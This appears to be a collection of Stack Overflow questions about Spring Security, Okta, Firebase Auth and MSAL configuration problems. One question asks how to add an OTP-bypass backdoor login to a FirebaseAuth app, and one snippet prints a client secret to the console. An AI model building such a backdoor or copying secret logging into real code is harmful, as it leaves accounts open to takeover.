<p>From the logs:</p>
<pre><code>FilterChainProxy:223 - Securing GET /home
AnonymousAuthenticationFilter:119 - Set SecurityContextHolder to anonymous SecurityContext
FilterSecurityInterceptor:261 - Failed to authorize filter invocation [GET /home] with attributes [authenticated]
DefaultRedirectStrategy:56 - Redirecting to /oauth2/authorization/service
</code></pre>
<p>Tried adding
.securityContext(securityContext -&gt; securityContext.
securityContextRepository(new HttpSessionSecurityContextRepository()))</p>
<p>to the above method but still the same issue.</p>
"
"<p>I tried setting up a very minimal Spring Authorization Server example as part of evaluating it for use in one of my projects. The Authorization Server will be used with a SPA application so the Authorization Code flow with PKCE will be used. I am using Spring Boot 3.2.0.</p>
<p>The example application is generated by <a href=""https://start.spring.io/"" rel=""nofollow noreferrer"">Spring Initializr</a> and consists of a single configuration file to set up the minimal requirements for an Authorization server that largely follows the <a href=""https://docs.spring.io/spring-authorization-server/reference/guides/how-to-pkce.html"" rel=""nofollow noreferrer"">&quot;How-To&quot; from the official docs</a></p>
<pre><code>@SpringBootApplication
@EnableWebSecurity
public class DemoApplication
{
    public static void main(String[] args) {
        SpringApplication.run(DemoApplication.class, args);
    }

    @Bean
    public UserDetailsService users() {
        UserDetails user = User.withDefaultPasswordEncoder()
                .username(&quot;admin&quot;)
                .password(&quot;admin&quot;)
                .roles(&quot;ADMIN&quot;)
                .build();
        return new InMemoryUserDetailsManager(user);
    }

    @Bean
    @Order(1)
    public SecurityFilterChain authorizationServerSecurityFilterChain(HttpSecurity http) throws Exception {
        OAuth2AuthorizationServerConfiguration.applyDefaultSecurity(http);

        http
                // Redirect to the login page when not authenticated from the
                // authorization endpoint
                .exceptionHandling((exceptions) -&gt; exceptions
                        .defaultAuthenticationEntryPointFor(
                                new LoginUrlAuthenticationEntryPoint(&quot;/login&quot;),
                                new MediaTypeRequestMatcher(MediaType.TEXT_HTML)
                        )
                );

        return http.cors(Customizer.withDefaults()).build();
    }

    @Bean
    @Order(2)
    public SecurityFilterChain defaultSecurityFilterChain(HttpSecurity httpSecurity) throws Exception
    {
        return httpSecurity
                .authorizeHttpRequests((authorize) -&gt; authorize
                        .requestMatchers(&quot;/admin/**&quot;).hasRole(&quot;ADMIN&quot;)
                        .requestMatchers(&quot;/&quot;, &quot;/**&quot;).permitAll()
                )
                .cors(Customizer.withDefaults())
                .formLogin(Customizer.withDefaults())
                .build();
    }

    @Bean
    public RegisteredClientRepository registeredClientRepository() {
        RegisteredClient publicClient = RegisteredClient.withId(UUID.randomUUID().toString())
                .clientId(&quot;public-client&quot;)
                .clientAuthenticationMethod(ClientAuthenticationMethod.NONE)
                .authorizationGrantType(AuthorizationGrantType.AUTHORIZATION_CODE)
                .redirectUri(&quot;http://127.0.0.1:4200&quot;)
                .clientSettings(ClientSettings.builder()
                        .requireAuthorizationConsent(true)
                        .requireProofKey(true)
                        .build()
                )
                .build();

        return new InMemoryRegisteredClientRepository(publicClient);
    }

    @Bean
    CorsConfigurationSource corsConfigurationSource()
    {
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        CorsConfiguration config = new CorsConfiguration();
        config.addAllowedHeader(&quot;*&quot;);
        config.addAllowedMethod(&quot;*&quot;);
        config.addAllowedOrigin(&quot;http://127.0.0.1:4200&quot;);
        config.setAllowCredentials(true);
        source.registerCorsConfiguration(&quot;/**&quot;, config);
        return source;
    }
}
</code></pre>
<p>When making a properly formed request to the <code>/authorize</code> endpoint I am redirected to the default login page as expected.
<a href=""https://i.stack.imgur.com/6pVi4.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/6pVi4.png"" alt=""Spring Authorization Server default log in page"" /></a></p>
<p>For the sake of completeness the example request that redirects me to this login page looks like <code>http://127.0.0.1:8080/oauth2/authorize?response_type=code&amp;client_id=public-client&amp;redirect_uri=http%3A%2F%2Flocalhost%3A4200&amp;state=1234xyz&amp;code_challenge=cFeDr-CjSa6l1C3w388Qoz1GpM3Pa0qzkOF9rq0Wp8A&amp;code_challenge_method=S256</code> using a code challenge and verifier generated by <a href=""https://example-app.com/pkce"" rel=""nofollow noreferrer"">PKCE Tools</a></p>
<p>When entering valid user credentials (as configured in the configuration above) I am redirected to the consent screen as expected.
<a href=""https://i.stack.imgur.com/sg51d.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/sg51d.png"" alt=""Spring Authorization Server consent screen"" /></a></p>
<p>However, upon granting consent by selecting the &quot;Submit Consent&quot; button I get an &quot;access_denied&quot; error returned in the redirect url. The url that gets redirected to is
<code>http://127.0.0.1:4200/?error=access_denied&amp;error_description=OAuth%202.0%20Parameter%3A%20client_id&amp;error_uri=https%3A%2F%2Fdatatracker.ietf.org%2Fdoc%2Fhtml%2Frfc6749%23section-4.1.2.1&amp;state=1234xyz</code></p>
<p>This includes the error message &quot;access_denied&quot; and error description &quot;OAuth 2.0 Parameter: client_id&quot; and points me to <a href=""https://datatracker.ietf.org/doc/html/rfc6749#section-4.1.2.1"" rel=""nofollow noreferrer"">a section of the RFC</a> which does not contain any further useful information for troubleshooting this specific error message.</p>
<p>Ostensibly, the error description indicates that Spring thinks there is something wrong with the client_id but I fail to see what could be wrong with it.</p>
<p>Which piece of the puzzle am I missing here that is causing me to receive this error for a valid user who has successfully authenticated and chosen to give their consent?</p>
<p><strong>EDIT 2024-02-19</strong></p>
<p>I noticed when revisiting this that my request to the authorization server was using <code>127.0.0.1</code> while my redirect was using <code>localhost</code>. I have since corrected this so that both the request and redirect use the same exact host and have tested it by trying out both hosts of <code>127.0.0.1</code> and <code>localhost</code>. However, the results when using either host in a consistent manner were the same as described in the original question and I am still receiving the &quot;access_denied&quot; error.</p>
<p>The question has been updated to show the use of <code>127.0.0.1</code>.</p>
"
"<p>I usually try to avoid using spring auth because it usually injects to many defaults that are extremely difficult to disable. But now I have a need to use JWT tokens. So I have created a security config but there is a Pre Authentication failure occurring that I can't firgure out how to disable: <code>Pre-authenticated entry point called. Rejecting access</code> Can anyone share with me how to disable the pre auth in a boot 3 app? Below is my current config</p>
<pre><code>@Bean
@Throws(Exception::class)
fun securityFilterChain(http: HttpSecurity): SecurityFilterChain {
    return http.csrf { it.disable() }
        .authorizeHttpRequests { it.anyRequest().authenticated() }
        .sessionManagement { it.sessionCreationPolicy(SessionCreationPolicy.STATELESS) }
        .authenticationProvider(authenticationProvider())
        .build()
}

@Bean
fun authenticationProvider(): AuthenticationProvider {
    val authenticationProvider = JwtAuthenticationProvider(jwtDecoder())
    return authenticationProvider
}

@Bean
fun jwtDecoder(): JwtDecoder {
    return NimbusJwtDecoder.withPublicKey(rsaProperties.publicKey).build()
}

@Bean
fun jwtEncoder(): JwtEncoder {
    val jwk: JWK =
        RSAKey.Builder(rsaProperties.publicKey).privateKey(rsaProperties.privateKey).build()

    val jwks: JWKSource&lt;SecurityContext&gt; = ImmutableJWKSet(JWKSet(jwk))
    return NimbusJwtEncoder(jwks)
}
</code></pre>
<p>Debug Logs for Spring Security Web:</p>
<pre><code>2024-02-14T13:58:20.238-08:00 DEBUG 5308 --- [tp1468039653-29] o.s.security.web.FilterChainProxy: Securing POST /v1/ds/123456789/register
2024-02-14T13:58:20.239-08:00 DEBUG 5308 --- [tp1468039653-29] o.s.s.w.a.AnonymousAuthenticationFilter: Set SecurityContextHolder to anonymous SecurityContext
2024-02-14T13:58:20.239-08:00 DEBUG 5308 --- [tp1468039653-29] o.s.s.w.a.Http403ForbiddenEntryPoint     : Pre-authenticated entry point called. Rejecting access
2024-02-14T13:58:20.243-08:00 DEBUG 5308 --- [tp1468039653-29] o.s.security.web.FilterChainProxy        : Securing POST /error
2024-02-14T13:58:20.244-08:00 DEBUG 5308 --- [tp1468039653-29] o.s.s.w.a.AnonymousAuthenticationFilter  : Set SecurityContextHolder to anonymous SecurityContext
2024-02-14T13:58:20.244-08:00 DEBUG 5308 --- [tp1468039653-29] o.s.s.w.a.Http403ForbiddenEntryPoint     : Pre-authenticated entry point called. Rejecting access
</code></pre>
"
"<p>I use Firebase and Vue 3 as state management. I use Vuex to create my login access, but I found a problem when the user has logged out. The page in /dashboard can still be accessed by users who are not logged in.</p>
<p>this my /src/main.js</p>
<pre><code>import { createApp } from 'vue'
import './style.css'
import App from './App.vue'
import router from './router'
import store from './store'

const app = createApp(App)

app.use(router);
app.use(store);
app.mount('#app');

</code></pre>
<p>this my /src/router/index.js</p>
<pre><code>import { createRouter, createWebHistory } from 'vue-router'

const routes = [
  {
    path: '/',
    name: 'page.login',
    component: () =&gt; import('./../pages/login/Login.vue')
  },
  {
    path: '/dashboard',
    name: 'page.dashboard',
    component: () =&gt; import('./../pages/dashboard/Dashboard.vue'),
    children: [
      {
        path: '/home',
        name: 'page.home',
        component: () =&gt; import('./../pages/home/Home.vue')
      },
      {
        path: '/profile',
        name: 'page.profile',
        component: () =&gt; import('./../pages/profile/Profile.vue')
      },
    ]
  }
];

const router = createRouter({
  history: createWebHistory(),
  routes
})

export default router;

</code></pre>
<p>this my /src/store/index.js</p>
<pre><code>import { createStore } from 'vuex'
import { auth } from '@/firebase/config'
import {
  createUserWithEmailAndPassword,
  signInWithEmailAndPassword,
  signOut,
  onAuthStateChanged
} from 'firebase/auth'

const store = createStore({
  state: {
    user: null,
    authIsReady: false,
  },
  getters: {
  },
  mutations: {
    setUser(state, payload) {
      state.user = payload,
        console.log('user state ', state.user);
    },
    setAuthIsReady(state, payload) {
      state.authIsReady = payload
    }
  },
  actions: {
    async regsiterUser(context, { email, password }) {
      const res = await createUserWithEmailAndPassword(auth, email, password)
      if (res) {
        context.commit('setUser', res.user)
      } else {
        throw new Error('could not complete Resgiter')
      }
    },
    async loginUser(context, { email, password }) {
      const res = await signInWithEmailAndPassword(auth, email, password)
      if (res) {
        context.commit('setUser', res.user)
      } else {
        throw new Error('cant Login')
      }
    },
    async logoutUser(context) {
      console.log('Sign Out');
      await signOut(auth)
      context.commit('setUser', null)
    }
  },
  modules: {
  }
})

const unsub = onAuthStateChanged(auth, (user) =&gt; {
  store.commit('setAuthIsReady', true)
  store.commit('setUser', user)
  unsub()
});

export default store;

</code></pre>
<p>so the problem is how do I add Auth guard to each router that I want to protect?
for example like this</p>
<pre><code>const routes = [
  {
    path: '/',
    name: 'page.login',
    component: () =&gt; import('./../pages/login/Login.vue')
    guardAuth: false
  },
  {
    path: '/dashboard',
    name: 'page.dashboard',
    component: () =&gt; import('./../pages/dashboard/Dashboard.vue'),
    children: [
      {
        path: '/home',
        name: 'page.home',
        component: () =&gt; import('./../pages/home/Home.vue')
        guardAuth: true
      },
      {
        path: '/profile',
        name: 'page.profile',
        component: () =&gt; import('./../pages/profile/Profile.vue')
        guardAuth: true
      },
    ]
  }
];
</code></pre>
<p>if <strong>guardAuth: false</strong> then the user can access the page even if they don't log in first, if <strong>guardAuth: true</strong> then the page cannot be accessed by the user if the user is not logged in and if a hardcore user enters the <strong>page.home</strong> page then they will automatically be redirected to the <strong>page.login</strong> page</p>
"
"<p><strong>Is there a way to synchronise or bridge the authentication from Firebase to MSAL so that MSAL uses the same credentials to acquire Access Tokens?</strong></p>
<p>I am in the process of building out a Next.js 14 app where I'd like users to be able to log in only using their Microsoft credentials via Firebase Authentication. Post login, I would need to use Microsoft's Authentication Library (MSAL) to generated the accessToken to use the Microsoft Graph API, but I want to avoid having users log in again for the MSAL part.</p>
<p>The challenge I'm facing is designing a single login flow that authenticates users via Firebase with Microsoft credentials and then seamlessly uses those credentials to authenticate with MSAL. Here's the conceptual workflow:</p>
<ul>
<li><strong>Initial Login:</strong> Users log in through Firebase using their Microsoft<br />
account. Firebase handles the authentication, and the user's<br />
Microsoft account is linked with Firebase.</li>
<li><strong>MSAL Integration:</strong> After the user is authenticated with Firebase, I
need to use MSAL for accessing the Microsoft Graph API. The ideal
scenario is that the authentication with Firebase somehow facilitates
or aligns with authenticating MSAL without requiring the user to
perform another login action.</li>
</ul>
<hr />
<p><strong>What I have tried so far :</strong>
I originally built a system (That Didn't use MSAL) that receives the accessToken and refreshToken provided during the Firebase Microsoft OAuth login, I then tried to renew the tokens manually using this endpoint request :</p>
<pre><code>export async function POST(request) {
  const cookieStore = cookies();
  const { refreshToken } = await request.json();

  try {
    const clientId = process.env.MICROSOFT_CLIENT_ID;
    const clientSecret = process.env.MICROSOFT_CLIENT_SECRET;

    console.log('Microsoft Client ID:', clientId);
    console.log('Microsoft Client Secret:', clientSecret);

    const response = await fetch('https://login.microsoftonline.com/common/oauth2/v2.0/token', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: new URLSearchParams({
        client_id: clientId,
        client_secret: clientSecret,
        grant_type: 'refresh_token',
        refresh_token: refreshToken,
        scope: 'https://graph.microsoft.com/.default',
      }),
    });
</code></pre>
<p><strong>For context I have a fully set up App registration with EntraID and have set all required permissions.</strong></p>
<p>I kept getting this response :</p>
<pre><code>Token refresh failed. Response: {

error: 'invalid_grant',

error_description: 'AADSTS9002313: Invalid request. Request is malformed or invalid. Trace ID: c1c66293-f79f-4b6f-95fd-d926a6446100 Correlation ID: e86878d8-6022-4ec1-be7a-f1406c04353e Timestamp: 2024-03-07 07:05:45Z',

error_codes: [ 9002313 ],

timestamp: '2024-03-07 07:05:45Z',

trace_id: 'c1c66293-f79f-4b6f-95fd-d926a6446100',

correlation_id: 'e86878d8-6022-4ec1-be7a-f1406c04353e',

error_uri: 'https://login.microsoftonline.com/error?code=9002313'

}
</code></pre>
<hr />
<p>Any advice, suggested approaches, or references to similar implementations would be greatly appreciated.</p>
<p>Thanks!</p>
"
"<p>I am using Spring 5.3.6 (not spring-boot) and Java 1.8 (I know it is a very old version, but it is the client's requirement).</p>
<p>I have a traditional web application and I am trying to integrate it with OKTA instead of Spring LDAP. However, I am facing two issues:</p>
<ol>
<li><p>The redirect URI is not coming to the controller even after trying all available options.</p>
</li>
<li><p>In one of the configured Interceptors, I can see that the Principal is OAuth2AuthenticationToken, but when I try to get the OAuth2AuthorizedClient, it is always null.</p>
</li>
</ol>
<p>I would appreciate any help you can provide with these issues. Thank you in advance.</p>
<p>Here is the code I am working with:</p>
<pre><code>OAuth2AuthorizedClient client = clientService.loadAuthorizedClient(authenticationToken.getAuthorizedClientRegistrationId(), authenticationToken.getName());

@Controller
public class OAuth2LoginController {
    
    @Autowired
    OAuth2AuthorizedClientService clientService; 
    
    private static final Logger logger = Logger.getLogger(OAuth2LoginController.class.getName());
    
    @RequestMapping(value = &quot;/login/oauth2/code/*&quot;)
    public String handleAuthorizationResponse(@RequestParam(&quot;code&quot;) String code, 
                                               @RequestParam(&quot;state&quot;) String state, 
                                               Principal principal) {
        logger.log(Level.INFO, &quot;code&quot; + code);
        logger.log(Level.INFO, &quot;state&quot; + state);
        return &quot;redirect:/home&quot;; 
    }
}

</code></pre>
<pre><code>@EnableWebSecurity
@EnableGlobalMethodSecurity(securedEnabled=true, prePostEnabled=true )
public class SecurityConfiguration extends WebSecurityConfigurerAdapter {

    InMemoryClientRegistrationRepository repository;
    InMemoryOAuth2AuthorizedClientService service ;

@Override
   protected void configure(HttpSecurity http) throws Exception {
      http
            .sessionManagement()
                .sessionCreationPolicy(SessionCreationPolicy.ALWAYS)
                .and()
                .csrf().disable()
           .headers().httpStrictTransportSecurity().disable()
            .and()
           .authorizeRequests()
               .antMatchers(&quot;/css/**&quot;, &quot;/img/**&quot;, &quot;/help/**&quot;, &quot;/js/**&quot;).permitAll()
               .antMatchers(&quot;/login/oauth2/code/okta&quot;).permitAll()
               .antMatchers(&quot;/login/oauth2/code/*&quot;).permitAll()
               .anyRequest().authenticated()
               .and()
           .oauth2Login()
           .and()
           .oauth2ResourceServer()
           .jwt(Customizer.withDefaults())
           .and()
           .oauth2Client(Customizer.withDefaults());
   }

   @Bean
   public OAuth2AuthorizedClientService authorizedClientService() {
       if (service == null) {
           service = new InMemoryOAuth2AuthorizedClientService(clientRegistrationRepository());
       } 
       return service;
   }

   @Bean
   public ClientRegistrationRepository clientRegistrationRepository() {
       if (repository == null) {
           List&lt;ClientRegistration&gt; registrations = Collections.singletonList(getRegistration());
           repository = new InMemoryClientRegistrationRepository(registrations);
       }
       return repository;
   }
   
      
   @Bean
   JwtDecoder jwtDecoder() {
       return JwtDecoders.fromOidcIssuerLocation(&quot;https://okta_domain/oauth2/default&quot;);
   }
   
   private ClientRegistration getRegistration() {
        return ClientRegistration.withRegistrationId(&quot;okta&quot;)
                .clientId(&quot;client_id&quot;)
                .clientAuthenticationMethod(ClientAuthenticationMethod.NONE) 
                .authorizationGrantType(AuthorizationGrantType.AUTHORIZATION_CODE)
                .redirectUriTemplate(&quot;{baseUrl}/login/oauth2/code/{registrationId}&quot;)
                .scope(&quot;openid&quot;, &quot;offline_access&quot;, &quot;mbc&quot;)
                .authorizationUri(&quot;https://okta_domain/oauth2/default/v1/authorize&quot;)
                .tokenUri(&quot;https://okta_domain/oauth2/default/v1/token&quot;)
                .userInfoUri(&quot;https://okta_domain/oauth2/default/v1/userinfo&quot;)
                .jwkSetUri(&quot;https://okta_domain/oauth2/default/v1/keys&quot;)
                .clientName(&quot;okta&quot;)
                .build();
    }
   }

</code></pre>
<p>import org.springframework.security.web.context.AbstractSecurityWebApplicationInitializer;</p>
<p>public class SecurityWebApplicationInitializer extends AbstractSecurityWebApplicationInitializer {</p>
<p>}</p>
<pre><code></code></pre>
"
"<p>I am using Firebase Phone Auth in react native application. I followed the documentation with the setup, but I'm getting this error on Android:</p>
<blockquote>
<p>This app is not authorized to use Firebase Authentication.Please verify that the correct package name and SHA-1 are configured in the Firebase Console</p>
</blockquote>
<p>I checked SHA1 and package name. To my understanding when I add new SHA1 hash corresponding OAuth2 Client Id is autogenerated in Google Cloud, but it seems like it didn't trigger (I've added 6 SHA1 keys, but have only 4 OAuth2 Client Ids). I assume that this might be a problem, but I have no clue how to resolve that. Any ideas?</p>
<p>I'm thinking about manually creating OAuth2 Client Id, but I wouldn't like to mess with firebase autogenerated stuff.</p>
"
"<p>I have an firebase app. I'm using firebase auth. This works good. The problem, when the users open the link on facebook app these are getting something like this<a href=""https://i.stack.imgur.com/dgIpM.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/dgIpM.png"" alt=""enter image description here"" /></a></p>
"
"<p>I had a working web app until 3.19.0 now after update to 3.19.2, then to beta, then to master and much googling and experimenting I need help:</p>
<p>flutter master channel 07mar2024 (commit?) not working with latest(?) firebase_auth</p>
<p>flutter run -d chrome
...
TypeError: Class constructor IndexedDBLocalPersistence cannot be invoked without 'new'
dart-sdk/lib/_internal/js_dev_runtime/private/ddc_runtime/operations.dart 369:37
_checkAndCall
dart-sdk/lib/_internal/js_dev_runtime/private/ddc_runtime/operations.dart 431:39  dcall
<a href=""https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js"" rel=""nofollow noreferrer"">https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js</a> 1:48595
_getInstance
<a href=""https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js"" rel=""nofollow noreferrer"">https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js</a> 1:144495
_initializeAuthInstance
...
hang</p>
"
"<p>So I am building an app and the owner asked me to create a backdoor that allows him to sign in to a phone number without using OTP.</p>
<p>How to do that using FirebaseAuth in Kotlin?</p>
<p>Thanks.</p>
"
"<p>I am trying to integrate OTP based verification in my flutter app with firebase. The steps that I have done till now are:</p>
<ol>
<li><p>Pubspec.yaml consist of these packages
a. firebase_auth: ^4.16.0
b. firebase_core: ^2.24.2</p>
</li>
<li><p>Configured firebase and connected it with the flutter app, generated the firebase_options.dart file.</p>
</li>
</ol>
<p>This is how my code looks in main.dart</p>
<pre><code>void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  await Firebase.initializeApp(
    options: DefaultFirebaseOptions.currentPlatform,
  );
  runApp(const MyApp());
}
</code></pre>
<p>This is how my login page looks</p>
<pre><code>import 'package:faekbank/screens/testScreen.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:flutter/material.dart';
import 'package:intl_phone_field/intl_phone_field.dart';

class PhoneNumberRegistration extends StatefulWidget {
  const PhoneNumberRegistration({super.key});

  @override
  State&lt;PhoneNumberRegistration&gt; createState() =&gt;
      _PhoneNumberRegistrationState();
}

class _PhoneNumberRegistrationState extends State&lt;PhoneNumberRegistration&gt; {
  String curPh = '';
  bool codeSent = false;
  String otp = '';
  String verifyId = '';
  bool deliberateLoader = true;
  bool codeSendRequested = false;
  TextEditingController phoneNumber = TextEditingController();
  TextEditingController otpController = TextEditingController();

  @override
  Widget build(BuildContext context) {
    double curHeight = MediaQuery.of(context).size.height;
    double curWidth = MediaQuery.of(context).size.width;
    double htpx = curHeight * 1 / 800;
    double wtpx = curWidth * 1 / 360;
    return Scaffold(
      body: SingleChildScrollView(
        child: SafeArea(
          child: Container(
            child: Padding(
              padding: EdgeInsets.symmetric(horizontal: wtpx * 21),
              child: Column(
                children: [
                  SizedBox(
                    height: 43 * htpx,
                  ),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.start,
                    children: [
                      Image.asset('assets/images/faekbank_logo.png'),
                    ],
                  ),
                  SizedBox(
                    height: 34 * htpx,
                  ),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.start,
                    children: [
                      Text(
                        &quot;Tell us about yourself&quot;,
                        style: Theme.of(context).textTheme.headlineSmall,
                      ),
                    ],
                  ),
                  SizedBox(
                    height: 34 * htpx,
                  ),
                  // ChextWidgets.chextField(
                  //     context: context,
                  //     hintText: &quot;Enter Phone Number&quot;,
                  //     enabled: !codeSent,
                  //     countryCode: true,
                  //     initialCountryCode: 'IN',
                  //     onChanged: (changedText) {
                  //       setState(() {
                  //         if (changedText != null) {
                  //           curPh = changedText;
                  //         }
                  //       });
                  //     },
                  //     isPhoneNumber: true),
                  IntlPhoneField(
                    controller: phoneNumber,
                    decoration: InputDecoration(
                      labelText: 'Phone Number',
                      border: OutlineInputBorder(
                        borderSide: BorderSide(
                            color: Theme.of(context).colorScheme.primary,
                            width: 2),
                      ),
                    ),
                    initialCountryCode: 'IN',
                    onChanged: (phone) {
                      print(phone.completeNumber);
                    },
                  ),
                  SizedBox(
                    height: 13 * htpx,
                  ),
                  codeSent
                      ? TextField(
                          controller: otpController,
                          decoration: const InputDecoration(
                              border: OutlineInputBorder(),
                              hintText: 'Enter OTP'),
                        )
                      : SizedBox(
                          height: 48 * htpx,
                        ),
                  SizedBox(
                    height: 45 * htpx,
                  ),
                  Image.asset('assets/images/onboarding_phone_number_deal.png'),
                  SizedBox(
                    height: 60 * htpx,
                  ),

                  codeSent
                      ? ElevatedButton(
                          onPressed: () async {
                            await FirebaseAuth.instance.verifyPhoneNumber(
                                verificationCompleted:
                                    (PhoneAuthCredential credential) {},
                                verificationFailed:
                                    (FirebaseAuthException ex) {},
                                codeSent:
                                    (String verificationId, int? resendToken) {
                                  setState(() {
                                    codeSent = true;
                                    verifyId = verificationId;
                                  });
                                },
                                codeAutoRetrievalTimeout:
                                    (String verificationId) {},
                                phoneNumber: phoneNumber.text.toString());
                          },
                          style: ElevatedButton.styleFrom(
                            minimumSize: const Size.fromHeight(50),
                            backgroundColor:
                                Theme.of(context).colorScheme.primary,
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(0),
                            ),
                          ),
                          child: Text(
                            &quot;Confirm&quot;,
                            style: Theme.of(context).textTheme.labelMedium,
                          ),
                        )

                      // This button will be visible once the otp has been sent.
                      : ElevatedButton(
                          onPressed: () async {
                            try {
                              PhoneAuthCredential credential =
                                  await PhoneAuthProvider.credential(
                                      verificationId: verifyId,
                                      smsCode: otpController.text.toString());

                              FirebaseAuth.instance
                                  .signInWithCredential(credential)
                                  .then((value) {
                                Navigator.push(
                                    context,
                                    MaterialPageRoute(
                                        builder: (context) =&gt;
                                            const TestScreen()));
                              });
                            } catch (e) {
                              print(&quot;This is your error: $e&quot;);
                            }
                          },
                          style: ElevatedButton.styleFrom(
                            minimumSize: const Size.fromHeight(50),
                            backgroundColor:
                                Theme.of(context).colorScheme.primary,
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(0),
                            ),
                          ),
                          child: Text(
                            &quot;Confirm&quot;,
                            style: Theme.of(context).textTheme.labelMedium,
                          ),
                        ),
                  const SizedBox(
                    height: 20,
                  ),
                  const Text(
                    &quot;Your data from this app is end to end encrypted&quot;,
                    style: TextStyle(
                      color: Color.fromARGB(255, 82, 81, 81),
                    ),
                  ),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }
}

</code></pre>
<p>Does anyone have an idea, how to solve this?</p>
"
"<p>I am working on a Next JS app using Firebase Authentication. I have successfully implemented this and also made an AuthContext file to store Authentication functions (login, signup, signout) and manage the Auth state. Here is my AuthContext file:</p>
<pre><code>const AuthContext = createContext();

export default AuthContext;

export const AuthProvider = ({ children }) =&gt; {
  const [user, setUser] = useState();
  const router = useRouter();

  useEffect(() =&gt; {
    const unsubscribe = onAuthStateChanged(auth, (currentUser) =&gt; {
      setUser(currentUser);
    });
    return () =&gt; unsubscribe();
  }, [user]);

  const handleRegister = async (e) =&gt; {
   ...
  };

  const handleLogin = async (e) =&gt; {
    const formData = new FormData(e.currentTarget);
    const email = formData.get(&quot;email&quot;);
    const password = formData.get(&quot;password&quot;);

    await signInWithEmailAndPassword(auth, email, password)
      .then((userCredential) =&gt; {
        router.push(&quot;/dashboard&quot;);
      })
      .catch((error) =&gt; {
        ...
      });
  };

  const handleLogout = () =&gt; {
    signOut(auth);
  };

  return (
    &lt;AuthContext.Provider
      value={{
        user,
        handleRegister,
        handleLogin,
        handleLogout,
      }}
    &gt;
      {children}
    &lt;/AuthContext.Provider&gt;
  );
};
</code></pre>
<p>Also, from NextJS documentation I learnt that:</p>
<blockquote>
<p>Middleware in Next.js helps you control who can access different parts
of your website. This is important for keeping areas like the user
dashboard protected while having other pages like marketing pages be
public. It's recommended to apply Middleware across all routes and
specify exclusions for public access.</p>
</blockquote>
<p>So, I have my middleware.js file in the root directory. And have the following code:</p>
<pre><code>import type { NextRequest } from 'next/server'
 
export function middleware(request: NextRequest) {
  const currentUser = request.cookies.get('currentUser')?.value
 
  if (currentUser &amp;&amp; !request.nextUrl.pathname.startsWith('/dashboard')) {
    return Response.redirect(new URL('/dashboard', request.url))
  }
 
  if (!currentUser &amp;&amp; !request.nextUrl.pathname.startsWith('/login')) {
    return Response.redirect(new URL('/login', request.url))
  }
}
 
export const config = {
  matcher: ['/((?!api|_next/static|_next/image|.*\\.png$).*)'],
}
</code></pre>
<p>However, it seems that I am unable to get currentUser as described above. So, how can I access the same using my <strong>user's state from Context</strong>? Is there any way to do so? If not what's ideal way to get user state in the middleware?</p>
"
"<p>I have a problem, when there is little data in Firebase it works great.
But when I added a lot of data (not very much), it had loading problems and couldn't display the data.
I opened the console to see what errors there were and I got these:
Failed to load resource: the server responded with a status of 404 (Not Found)</p>
<pre><code>https://firestore.googleapis.com/google.firestore.v1.Firestore/Listen/channel?gsessionid=gEj-BqgbTh4aV_oeJcC9WJk8W5CG4GO-MP-T7wEjx0Y&amp;VER=8&amp;database=***%2F***-1c5da%2Fdatabases%2F(default )&amp;RID=rpc&amp;SID=***vm08bUxCCrD37d0g&amp;AID=64&amp;CI=0&amp;TYPE=xmlhttp&amp;zx=***702exk8t3&amp;t=3
</code></pre>
<p>Firebase Issue</p>
<p><a href=""https://i.stack.imgur.com/YQvry.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/YQvry.png"" alt="""" /></a></p>
<p>What can I do to fix the data loading problem?</p>
<p>Thanks</p>
<p>I try to fix it but i didnt fint solution</p>
<p>This is the</p>
<pre class=""lang-js prettyprint-override""><code>import { ScrollView, StyleSheet, View, ActivityIndicator } from 'react-native'
import React, { useState, useEffect } from 'react'
import { Button, CategoriesView, Input, Label, Layout, ListFooter } from '../../components'
import En from '../../data/locals/En'
import { hp, commonStyles, wp, COLOR } from '../../data/StyleGuides'
import { IMAGES } from '../../assets/images'
import { FIREBASE_COLLECTION, SCREEN } from '../../data/enums'
import { useDoubleSearch, usePagination, useSearch } from '../../utils/hooks'
import { deleteDocument, getCollectionData } from '../../services/firebaseServices'
import { useIsFocused } from '@react-navigation/native'
import { textLimit } from '../../utils/Helper'

const CategoryContentScreen = ({ navigation, route }) =&gt; {
    const documentId = route?.params?.id
    const [loading, setLoading] = useState(false)
    const [subContent, setSubContent] = useState([])
    // const [subContentData, { search, handleSearch }] = useDoubleSearch(subContent, 'studyName', 'studyName')
    const [subContentData, { search, handleSearch }] = useSearch(subContent, 'studyName')
    const isFocused = useIsFocused()
    const {
        renderData,
        currentPage,
        moveToNextPage,
        moveToPreviousPage,
        showPreviousButton,
        showNextButton,
        noteString,
    } = usePagination(subContentData)
    useEffect(() =&gt; {
        getSubCategoriesData()
    }, [isFocused])
    const getSubCategoriesData = async () =&gt; {
        setLoading(true)
        const data = await getCollectionData(FIREBASE_COLLECTION.CATEGORY_CONTENT)
        const selectedDocuments = data.filter(x =&gt; x?.parentId == documentId)
        setSubContent(selectedDocuments)
        setLoading(false)
    }
    const getSerialNumber = (index) =&gt; {
        const entriesPerPage = 5
        return (currentPage - 1) * entriesPerPage + index + 1
    }
    const handleDeleteItem = (id) =&gt; {
        deleteDocument(FIREBASE_COLLECTION.CATEGORY_CONTENT, id)
        getSubCategoriesData()
    }
    return (
        &lt;Layout title={En.subCategoriesContent}&gt;
            &lt;View style={styles.headerStyle}&gt;
                &lt;Button
                    style={styles.buttonStyle}
                    text={En.addNewContent}
                    icon={IMAGES.AddIcon}
                    onPress={() =&gt; navigation.navigate(SCREEN.ADD_CATEGORIES_NOTE, { parentId: documentId })}
                /&gt;
                &lt;View style={commonStyles.horizontalView}&gt;
                    &lt;Input
